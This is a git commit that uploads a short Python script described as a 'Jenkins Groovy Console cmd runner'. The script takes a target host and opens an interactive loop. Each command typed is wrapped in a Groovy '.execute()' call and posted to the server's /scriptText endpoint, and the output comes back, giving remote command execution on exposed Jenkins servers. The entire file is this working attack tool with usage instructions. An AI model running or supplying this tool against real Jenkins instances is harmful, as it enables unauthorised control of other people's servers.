1db3a23d82bac66897701d9a7bf4d0fc03087ac6
developersl-vihaga <githubdevelopersl@gmail.com>
2025-05-07 02:00:44 +0530

    Upload script_576.py

---
+++ script_576.py
@@ -0,0 +1,24 @@
+from __future__ import print_function
+from builtins import input
+import requests
+import sys
+print("""
+Jenkins Groovy Console cmd runner.
+usage: ./jgc.py [HOST]
+Then type any command and wait for STDOUT output from remote machine.
+Type 'exit' to exit :)
+""")
+URL = sys.argv[1] + '/scriptText'
+HEADERS = {
+    'User-Agent': 'jgc'
+}
+while 1:
+    CMD = input(">> Enter command to execute (or type 'exit' to exit): ")
+    if CMD == 'exit':
+        print("exiting...\n")
+        exit(0)
+    DATA = {
+        'script': 'println "{}".execute().text'.format(CMD)
+    }
+    result = requests.post(URL, headers=HEADERS, data=DATA)
+    print(result.text)
